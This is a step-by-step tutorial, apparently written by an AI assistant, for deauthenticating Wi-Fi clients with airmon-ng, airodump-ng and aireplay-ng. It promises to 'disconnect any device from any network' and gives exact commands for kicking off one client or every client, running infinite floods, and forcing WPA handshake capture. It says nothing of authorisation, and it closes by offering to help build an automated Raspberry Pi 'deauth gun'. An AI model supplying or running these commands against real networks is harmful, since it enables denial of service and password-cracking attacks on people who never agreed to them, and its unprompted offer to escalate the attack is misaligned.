## What is a Deauthentication Attack?

- It exploits a **vulnerability in the 802.11 protocol**.
- The attacker sends **fake deauthentication frames** to the client and/or the AP.
- These frames are **unauthenticated**, so the AP **believes them**.
- The result? The client is **kicked off the network**.


## What You Need

- A Wi-Fi adapter that supports **monitor mode** and **packet injection**
- Kali Linux or Parrot OS
- Tools: `airmon-ng`, `airodump-ng`, `aireplay-ng`


## Step-by-Step: Disconnect Any Device from Any Network

### 1. Put Adapter in Monitor Mode

```bash
sudo airmon-ng start wlan0
```

Let’s assume you now have `wlan0mon`.


### 2. Scan Nearby Networks

```bash
sudo airodump-ng wlan0mon
```

You’ll get:
- `BSSID` → MAC address of the AP
- `CH` → Channel
- Client devices under "STATION" section

Hit `Ctrl+C` once you've found your target.


### 3. Lock to Target Network & Channel

```bash
sudo airodump-ng --bssid <AP_BSSID> --channel <CH> wlan0mon
```

Replace:
- `<AP_BSSID>` with the AP MAC (e.g., `F8:9E:28:00:11:22`)
- `<CH>` with channel (e.g., `6`)

Let this run in one terminal, or note the info and continue.


### 4. Launch Deauthentication Attack

```bash
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <Client_MAC> wlan0mon
```

- `-a` = AP MAC
- `-c` = Client MAC (optional, if you want to target 1 device)
- `10` = number of deauth packets (can be `0` for infinite)

### Example: Disconnect One Device

```bash
sudo aireplay-ng --deauth 50 -a F8:9E:28:00:11:22 -c 58:FB:84:12:34:56 wlan0mon
```

### Example: Disconnect Everyone from the AP

```bash
sudo aireplay-ng --deauth 100 -a F8:9E:28:00:11:22 wlan0mon
```

## Signs It Worked:
- The client disconnects from Wi-Fi.
- In real-time, you might see them reconnect (especially if you're also running `airodump-ng`).
- You can use this to **force a WPA handshake**.

## Pro Tips

- Use `--ignore-negative-one` if you get channel warnings.
- Some devices auto-reconnect quickly — hit them with repeated deauths or use `--deauth 0` for infinite.
- Want to **automate** this or build a deauth gun with Raspberry Pi? I can help you set that up too.
